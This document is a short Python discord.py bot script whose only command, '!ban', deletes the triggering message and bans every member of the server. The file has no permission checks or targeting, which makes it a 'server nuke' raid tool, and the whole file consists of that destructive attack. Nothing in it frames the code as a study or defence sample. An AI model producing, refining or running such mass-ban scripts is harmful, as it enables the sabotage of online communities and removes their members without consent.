import discord
import asyncio
from discord.ext import commands

token = "token"

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

@bot.event
async def on_ready():
	print('Connected !!\n')
	print('!ban')

@bot.command(name="ban")
async def ban(ctx):
	await ctx.message.delete()
	for member in ctx.guild.members:
		try:
			await member.ban()
		except Exception as f:
			print(f)
			
bot.run(token)
